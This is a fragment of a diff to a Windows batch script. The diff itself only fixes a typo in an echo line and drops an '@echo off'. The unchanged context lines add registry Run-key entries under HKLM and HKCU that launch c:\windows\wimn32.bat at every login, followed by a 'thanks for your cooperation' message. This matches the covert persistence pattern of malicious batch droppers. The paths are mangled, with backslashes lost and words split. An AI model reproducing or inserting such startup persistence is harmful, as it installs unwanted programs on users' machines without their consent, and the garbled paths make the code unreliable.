@@ -38,9 +38,8 @@ reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsA
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
 echo Loading...
 echo Thanks you for your coroperation!
-echo YOu may now close this by pressing enter...
+echo You may now close this by pressing enter...
 PAUSE
-@echo off
 cls
 
 COLOR 0F
